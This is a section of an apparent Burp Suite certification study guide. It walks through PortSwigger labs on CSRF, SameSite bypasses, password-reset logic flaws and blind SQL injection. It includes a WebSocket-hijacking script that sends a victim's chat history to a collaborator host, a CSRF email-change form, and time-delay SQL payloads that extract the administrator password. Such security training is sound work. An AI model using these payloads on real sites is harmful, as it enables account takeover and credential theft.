<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">CSRF No Defences</h3><a id="user-content-csrf-no-defences" class="anchor" aria-label="Permalink: CSRF No Defences" href="#csrf-no-defences"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Target with no defences against email change function, can allow the privilege escalation to admin role. In the exam changing the email to the <code>attacker@EXPLOIT.NET</code> email address on the exploit server can allow the attacker to change the password of the admin user, resulting in privilege escalation.<br>
In the exam there is only <em><strong>one</strong></em> active user, and if the previous stage was completed using an attack that did not require the involving of the active user clicking on a link by performing poison cache or performing phishing attack by means of <code>Deliver to Victim</code> function, then CSRF change exploit can be used.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-change-email.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/csrf-change-email.png" alt="csrf-change-email.png" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/csrf/lab-no-defenses" rel="nofollow">PortSwigger Lab: CSRF vulnerability with no defences</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">SameSite Strict bypass</h3><a id="user-content-samesite-strict-bypass" class="anchor" aria-label="Permalink: SameSite Strict bypass" href="#samesite-strict-bypass"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">In the live chat function, we notice the <code>GET /chat HTTP/2</code> request do not use any unpredictable tokens, this can <em><strong>identify</strong></em> possible  <a href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking" rel="nofollow">cross-site WebSocket hijacking</a> (CSWSH) vulnerability if possible to bypass <a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions" rel="nofollow">SameSite</a> cookie restriction.</p>
</blockquote>
<blockquote>
<p dir="auto">Host on exploit server POC payload to <em><strong>identify</strong></em> CSWSH vulnerability.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;script&gt;
    var ws = new WebSocket('wss://TARGET.net/chat');
    ws.onopen = function() {
        ws.send(&quot;READY&quot;);
    };
    ws.onmessage = function(event) {
        fetch('https://OASTIFY.COM', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;"><pre class="notranslate"><code>&lt;script&gt;
    var ws = new WebSocket('wss://TARGET.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://OASTIFY.COM', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;
</code></pre></div>
<blockquote>
<p dir="auto">The <code>SameSite=Strict</code> is set for session cookies and this prevent the browser from including these cookies in XSS cross-site requests. We <em><strong>Identify</strong></em> the header <code>Access-Control-Allow-Origin</code> in additional requests to script and images to a subdomain at <code>cms-</code>.<br>
Browsing to this CDN subdomain at <code>cms-</code> and then <em><strong>identify</strong></em> that random user name input is reflected, confirmed this to be a <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" rel="nofollow">reflected XSS</a> vulnerability.</p>
</blockquote>
<p dir="auto"><a href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/cms-reflected-xss-samesite-bypass.png">cms reflected xss samesite bypass</a></p>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="https://cms-TARGET.net/login?username=%3Cscript%3Ealert%28%27reflectXSS%27%29%3C%2Fscript%3E&amp;password=pass"><pre class="notranslate"><code>https://cms-TARGET.net/login?username=%3Cscript%3Ealert%28%27reflectXSS%27%29%3C%2Fscript%3E&amp;password=pass
</code></pre></div>
<blockquote>
<p dir="auto">Bypass the SameSite restrictions, by URL encode the entire script below and using it as the input to the CDN subdomain at <code>cms-</code> username login, hosted on exploit server.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;script&gt;
    var ws = new WebSocket('wss://TARGE.net/chat');
    ws.onopen = function() {
        ws.send(&quot;READY&quot;);
    };
    ws.onmessage = function(event) {
        fetch('https://OASTIFY.COM', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;"><pre class="notranslate"><code>&lt;script&gt;
    var ws = new WebSocket('wss://TARGE.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://OASTIFY.COM', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;
</code></pre></div>
<blockquote>
<p dir="auto">Host the following on exploit server and deliver to victim, once the collaborator receive the victim chat history with their password, result in account takeover.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;script&gt;
    document.location = &quot;https://cms-TARGET.net/login?username=ENCODED-POC-CSWSH-SCRIPT&amp;password=Peanut2019&quot;;
&lt;/script&gt;"><pre class="notranslate"><code>&lt;script&gt;
    document.location = "https://cms-TARGET.net/login?username=ENCODED-POC-CSWSH-SCRIPT&amp;password=Peanut2019";
&lt;/script&gt;
</code></pre></div>
<blockquote>
<p dir="auto">The chat history contain password for the victim.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/chat-history.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/chat-history.png" alt="chat-history.png" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain" rel="nofollow">PortSwigger Lab: SameSite Strict bypass via sibling domain</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">SameSite Lax bypass</h3><a id="user-content-samesite-lax-bypass" class="anchor" aria-label="Permalink: SameSite Lax bypass" href="#samesite-lax-bypass"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Observe if you visit <code>/social-login</code>, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction., and in proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.</p>
</blockquote>
<blockquote>
<p dir="auto">Bypass the popup blocker, to induce the victim to click on the page and only opens the popup once the victim has clicked, with the following JavaScript. The exploit JavaScript code first refreshes the victim's session by forcing their browser to visit <code>/social-login</code>, then submits the email change request after a short pause. Deliver the exploit to the victim.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="&lt;form method=&quot;POST&quot; action=&quot;https://TARGET.net/my-account/change-email&quot;&gt;
    &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;administrator@exploit-server.net&quot;&gt;
&lt;/form&gt;
&lt;p&gt;Click anywhere on the page&lt;/p&gt;
&lt;script&gt;
    window.onclick = () =&gt; {
        window.open('https://TARGET.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
&lt;/script&gt;"><pre class="notranslate"><code>&lt;form method="POST" action="https://TARGET.net/my-account/change-email"&gt;
    &lt;input type="hidden" name="email" value="administrator@exploit-server.net"&gt;
&lt;/form&gt;
&lt;p&gt;Click anywhere on the page&lt;/p&gt;
&lt;script&gt;
    window.onclick = () =&gt; {
        window.open('https://TARGET.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
&lt;/script&gt;
</code></pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh" rel="nofollow">PortSwigger Lab: SameSite Lax bypass via cookie refresh</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Password Reset</h2><a id="user-content-password-reset" class="anchor" aria-label="Permalink: Password Reset" href="#password-reset"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#refresh-password-broken-logic">Refresh Password broken logic</a><br>
<a href="#current-password">Current Password</a><br>
<a href="#time-sensitive-password-tokenz">Time-Sensitive Password Tokenz</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Refresh Password broken logic</h3><a id="user-content-refresh-password-broken-logic" class="anchor" aria-label="Permalink: Refresh Password broken logic" href="#refresh-password-broken-logic"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">If the application <a href="#subtly-invalid-login">Refresh Password</a> feature is flawed, this vulnerability can be exploited to identify valid accounts or obtain password reset token. This can lead to identifying valid users accounts or privilege escalation.</p>
</blockquote>
<blockquote>
<p dir="auto">This is the type of vulnerability that do not require active user on application to interact with the exploit, and without any user clicking on link or interaction. Take note of vulnerabilities that do not require active user on application for the BSCP exam, as this mean in the next stage of the exam it is possible to use for example <a href="#cors">other</a> interactive phishing links send to victim.</p>
</blockquote>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> in the <code>source code</code> for the <code>/forgot-password</code> page the username is a hidden field.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/passwoed-reset-hidden-username.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/passwoed-reset-hidden-username.png" alt="Password reset hidden username" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Exploit the post request by deleting the <code>temp-forgot-password-token</code> parameter in both the URL and request body. Change the username parameter to <code>carlos</code>.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/temp-forgot-password-token.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/temp-forgot-password-token.png" alt="Temp-forgot-password-token" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic" rel="nofollow">PortSwigger Lab: Password reset broken logic</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Current Password</h3><a id="user-content-current-password" class="anchor" aria-label="Permalink: Current Password" href="#current-password"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> the Change password do not need the <code>current-password</code> parameter to set a new password, and the <strong>user</strong> whom password will be changed is based on POST parameter <code>username=administrator</code><br>
In the PortSwigger labs they provide you the credentials for <code>wiener:peter</code>, and this simulate in the exam stage 1 achieved low level user access. In exam this password reset vulnerability is example of how it is possible without <strong>interaction</strong> from active user to privilege escalate your access to admin.</p>
</blockquote>
<blockquote>
<p dir="auto">Intercept the <code>/my-account/change-password</code> request as the <code>csrf</code> token is single random use value, set <code>username=administrator</code>, and remove <code>current-password</code> parameter.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/change-password-without-current.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/change-password-without-current.png" alt="Change password without current" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint" rel="nofollow">PortSwigger Lab: Weak isolation on dual-use endpoint</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Time-Sensitive Password Tokenz</h3><a id="user-content-time-sensitive-password-tokenz" class="anchor" aria-label="Permalink: Time-Sensitive Password Tokenz" href="#time-sensitive-password-tokenz"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">The target site uses time stamps to generate a hash password reset token URL.</p>
</blockquote>
<blockquote>
<p dir="auto">By sending parallel force password reset requests for two different users at the same time,<br>
will result in duplicate matching tokens because the same timestamp used by backend to generate the reset tokenz.</p>
</blockquote>
<blockquote>
<p dir="auto">Our own user <code>carlos</code> receive the reset token url in their email and then edit the name in the url to match <code>administrator</code> target victim user.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/portswigger_race_condition_force-forgot-password-tokenz.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/portswigger_race_condition_force-forgot-password-tokenz.png" alt="portswigger_race_condition_force-forgot-password-tokenz.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities" rel="nofollow">PortSwigger Lab: Exploiting time-sensitive vulnerabilities</a></p>
</blockquote>
<blockquote>
<p dir="auto"><a href="https://github.com/botesjuan/API-Web-Security/blob/main/module/race-condition.md#time-sensitive-tokenz">Reference: API University and PortSwigger Labs study notes</a></p>
</blockquote>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">SQL Injection</h2><a id="user-content-sql-injection" class="anchor" aria-label="Permalink: SQL Injection" href="#sql-injection"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#blind-time-delay">Blind Time Delay</a><br>
<a href="#blind-sqli">Blind SQLi</a><br>
<a href="#blind-sqli-no-indication">Blind SQLi no indication</a><br>
<a href="#blind-sqli-conditional-response">Blind SQLi Conditional Response</a><br>
<a href="#oracle">Oracle</a><br>
<a href="#sqlmap">SQLMAP</a><br>
<a href="#non-oracle-manual-sqli">Non-Oracle Manual SQLi</a><br>
<a href="#visual-error-based-sqli">Visual error-based SQLi</a><br>
<a href="https://github.com/botesjuan/cpts-quick-references/blob/main/module/SQL%20Injection%20Fundamentals.md">HackTheBox CPTS SQLi Fundamentals</a></p>
<blockquote>
<p dir="auto">Error based or Blind SQL injection vulnerabilities, allow SQL queries in an application to be used to extract data or login credentials from the  database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.</p>
</blockquote>
<blockquote>
<p dir="auto"><em><strong>Identify</strong></em> SQLi, by adding a double (") or single quote (') to web parameters or tracking cookies, if this break the SQL syntax resulting in error message response, then positive SQL injection <em><strong>identified</strong></em>. If no error or conditional message observed test blind <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" rel="nofollow">Time delays</a> payloads.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" rel="nofollow">SQL Injection cheat sheet examples</a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-sqli-parameter.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-sqli-parameter.png" alt="Identify the input parameter vulnerable to SQL injection" style="max-width: 100%;"></a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Blind Time Delay</h3><a id="user-content-blind-time-delay" class="anchor" aria-label="Permalink: Blind Time Delay" href="#blind-time-delay"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Blind SQL injection with time delays is tricky to <em><strong>identify</strong></em>, fuzzing involves educated guessing as OffSec also taught me in OSCP. The below payload will perform conditional case to delay the response by 10 seconds if positive SQL injection <em><strong>identified</strong></em>.</p>
</blockquote>
<blockquote>
<p dir="auto">Identify SQLi vulnerability. In <a href="https://portswigger.net/web-security/certification/takepracticeexam/index.html" rel="nofollow">Burp Practice exam Stage 2</a> the advance search filters are vulnerable to <code>PostgreSQL</code>. I found <code>SQLMAP</code> tricky to identify and exploit the practice exam vulnerability in advance search. Manual exploit of the SQL injection time delay in <a href="#practice-exam-postgresql-timedelay">Practice Exam here</a>.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content=";SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--"><pre>;<span class="pl-k">SELECT</span> CASE WHEN (<span class="pl-c1">1</span><span class="pl-k">=</span><span class="pl-c1">1</span>) THEN pg_sleep(<span class="pl-c1">7</span>) ELSE pg_sleep(<span class="pl-c1">0</span>) END<span class="pl-c"><span class="pl-c">--</span></span></pre></div>
<blockquote>
<p dir="auto"><a href="https://www.urlencoder.org/" rel="nofollow">URL encoded</a> <code>PostgreSQL</code> payload.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--"><pre><span class="pl-s"><span class="pl-pds">'</span>%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--</span></pre></div>
<blockquote>
<p dir="auto">Determine how many characters are in the password of the administrator user. To do this, increment the number after <code>&gt;1</code> conditional check.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content=";SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)&gt;1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"><pre>;<span class="pl-k">SELECT</span><span class="pl-k">+</span>CASE<span class="pl-k">+</span>WHEN<span class="pl-k">+</span>(username<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>administrator<span class="pl-pds">'</span></span><span class="pl-k">+</span><span class="pl-k">AND</span><span class="pl-k">+</span>LENGTH(password)<span class="pl-k">&gt;</span><span class="pl-c1">1</span>)<span class="pl-k">+</span>THEN<span class="pl-k">+</span>pg_sleep(<span class="pl-c1">10</span>)<span class="pl-k">+</span>ELSE<span class="pl-k">+</span>pg_sleep(<span class="pl-c1">0</span>)<span class="pl-k">+</span>END<span class="pl-k">+</span><span class="pl-k">FROM</span><span class="pl-k">+</span>users<span class="pl-c"><span class="pl-c">--</span></span></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/blind-time-delay.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/blind-time-delay.png" alt="blind-time-delay SQLi" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Using CLUSTER Bomb attack to re-run the attack for each permutation of the character positions in the password, and to determine character value.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content=";SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"><pre>;<span class="pl-k">SELECT</span><span class="pl-k">+</span>CASE<span class="pl-k">+</span>WHEN<span class="pl-k">+</span>(username<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>administrator<span class="pl-pds">'</span></span><span class="pl-k">+</span><span class="pl-k">AND</span><span class="pl-k">+</span><span class="pl-c1">SUBSTRING</span>(password,<span class="pl-c1">1</span>,<span class="pl-c1">1</span>)<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>a<span class="pl-pds">'</span></span>)<span class="pl-k">+</span>THEN<span class="pl-k">+</span>pg_sleep(<span class="pl-c1">10</span>)<span class="pl-k">+</span>ELSE<span class="pl-k">+</span>pg_sleep(<span class="pl-c1">0</span>)<span class="pl-k">+</span>END<span class="pl-k">+</span><span class="pl-k">FROM</span><span class="pl-k">+</span>users<span class="pl-c"><span class="pl-c">--</span></span></pre></div>
<blockquote>
<p dir="auto">Using CLUSTER bomb attack type with two payload, first for the length of the password <code>1..20</code> and then second using characters <code>a..z</code> and numbers <code>0..9</code>. Add the <strong>Response Received</strong> column to the intruder attack results to sort by and observe the <code>10</code> seconds or  more delay as positive response.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/blind-cluster-bomb.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/blind-cluster-bomb.png" alt="blind CLUSTER bomb SQLi" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval" rel="nofollow">PortSwigger Lab: Blind SQL injection with time delays and information retrieval</a></p>
